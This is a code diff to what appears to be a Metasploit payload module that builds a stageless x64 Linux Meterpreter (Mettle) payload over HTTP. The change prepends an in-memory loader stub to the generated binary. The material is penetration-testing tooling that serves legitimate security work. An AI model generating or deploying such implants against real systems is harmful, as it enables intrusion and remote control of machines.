@@ -10,6 +10,7 @@ module MetasploitModule
   include Msf::Payload::Single
   include Msf::Sessions::MeterpreterOptions::Linux
   include Msf::Sessions::MettleConfig
+  include Msf::Payload::Linux::X64::MeterpreterLoader
 
   def initialize(info = {})
     super(
@@ -31,11 +32,12 @@ module MetasploitModule
     )
   end
 
-  def generate(_opts = {})
+  def generate
     opts = {
       scheme: 'http',
       stageless: true
     }.merge(mettle_logging_config)
-    MetasploitPayloads::Mettle.new('x86_64-linux-musl', generate_config(opts)).to_binary :exec
+    payload = MetasploitPayloads::Mettle.new('x86_64-linux-musl', generate_config(opts)).to_binary :exec
+    in_memory_load(payload) + payload
   end
 end
